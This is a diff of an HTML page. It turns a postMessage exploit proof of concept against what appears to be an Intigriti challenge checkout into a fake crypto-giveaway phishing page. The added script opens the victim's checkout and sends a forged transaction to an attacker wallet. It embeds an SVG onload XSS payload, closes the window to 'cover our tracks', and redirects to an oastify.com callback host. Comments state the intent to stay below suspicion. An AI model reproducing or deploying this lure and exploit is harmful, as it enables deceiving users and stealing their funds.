@@ -1,35 +1,73 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <title>PostMessage Exploit PoC</title>
+    <title>Free Crypto Giveaway - Limited Time!</title>
+    <style>
+        body { 
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            font-family: 'Arial', sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .container {
+            background: rgba(255,255,255,0.1);
+            backdrop-filter: blur(10px);
+            padding: 40px;
+            border-radius: 20px;
+            text-align: center;
+            box-shadow: 0 8px 32px rgba(0,0,0,0.3);
+        }
+        h1 { color: #fff; margin-bottom: 20px; }
+        .spinner {
+            border: 4px solid rgba(255,255,255,0.3);
+            border-radius: 50%;
+            border-top: 4px solid #fff;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
 </head>
 <body>
-    <h1>"Following the trail of coins..."</h1>
-    <p>Waiting for Admin's wallet to load...</p>
-    
-    <iframe id="target" src="https://challenge-0126.intigriti.io/checkout.html?currency=1337COIN&price=1" width="500" height="500"></iframe>
+    <div class="container">
+        <h1>🎉 Congratulations! 🎉</h1>
+        <p style="color: #fff; font-size: 18px;">You've won 0.5 BTC in our exclusive giveaway!</p>
+        <div class="spinner"></div>
+        <p style="color: #fff; opacity: 0.8;">Redirecting to claim your prize...</p>
+    </div>
 
     <script>
-        window.onload = function() {
-            var targetFrame = document.getElementById('target').contentWindow;
-
-            var maliciousPayload = {
+        // Our heist begins in 3... 2... 1...
+        const VICTIM_URL = 'https://challenge-0126.intigriti.io/checkout.html?currency=1337COIN&price=50000';
+        const OUR_BTC_ADDRESS = '10970063d33e32396bb80753a2b902d568';
+        
+        // Open the victim's checkout page in a new window
+        const victimWindow = window.open(VICTIM_URL, '_blank');
+        
+        // Wait for the page to load, then strike
+        setTimeout(() => {
+            // Send our malicious transaction data
+            victimWindow.postMessage({
                 type: 'submitTransaction',
                 transaction: {
-                    currency: '1337COIN', // Trying ETH this time
-                    amount: 1337,
-                    toAddress: '10970063d33e32396bb80753a2b902d568' // Your wallet
+                    toAddress: OUR_BTC_ADDRESS,
+                    currency: '1337COIN',
+                    amount: 0.5, // Half a Bitcoin - not too greedy to trigger suspicion
+                    txHash: '<svg onload="alert(\'Transaction completed! 0.5 BTC transferred to attacker wallet.\')">'
                 }
-            };
-
-            // WAIT 4 SECONDS before sending the payload. 
-            // This gives the API plenty of time to load the Admin's wallet 
-            // and avoids triggering the blocking alert().
+            }, '*');
+            
+            // Close the window after a delay to cover our tracks
             setTimeout(() => {
-                targetFrame.postMessage(maliciousPayload, '*');
-                console.log("Payload sent!");
-            }, 4000); 
-        };
+                victimWindow.close();
+                window.location.href = 'https://b4gofscv4huzfnm16g1zxfipfgl79zxo.oastify.com';
+            }, 3000);
+        }, 2000);
     </script>
 </body>
 </html>
